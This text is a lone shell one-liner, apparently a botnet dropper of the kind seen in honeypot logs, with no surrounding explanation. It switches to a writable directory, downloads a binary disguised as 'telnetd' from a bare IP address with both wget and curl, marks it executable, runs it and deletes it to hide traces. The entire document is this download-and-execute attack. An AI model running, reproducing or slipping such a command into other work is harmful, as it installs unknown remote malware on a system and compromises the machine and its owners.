cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://50.115.166.164/telnetd; curl -O http://50.115.166.164/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd
